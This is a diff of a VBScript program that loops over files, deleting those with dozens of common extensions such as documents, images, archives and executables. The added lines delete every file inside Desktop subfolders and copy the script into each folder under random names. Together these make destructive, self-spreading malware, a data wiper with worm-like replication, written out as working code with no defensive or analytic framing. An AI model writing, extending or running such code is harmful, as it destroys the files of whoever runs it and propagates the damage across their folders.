@@ -50,8 +50,24 @@ Do
         Dim extension
         extension = LCase(objFSO.GetExtensionName(objFile.Name))
         If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
-            objFSO.DeleteFile(objFile.Path)
+            objFSO.DeleteFile(objFile)
         End If
+    Next
+
+        ' Loop through each folder on the Desktop and delete files within them
+    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+        For Each objFile In objFolder.Files
+            objFSO.DeleteFile(objFile.Path)
+        Next
+    Next
+
+    ' Generate copies of the script within each folder on the Desktop
+    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+        For i = 1 To numCopies
+            randomIteration = Int((1000 * Rnd) + 1)
+            strCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
+            objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
+        Next
     Next
 
 Loop
@@ -77,11 +93,4 @@ Sub DeleteFilesExceptVBS(folderPath)
     
     On Error GoTo 0
 End Sub
-
-
-
-
-
-
-
 
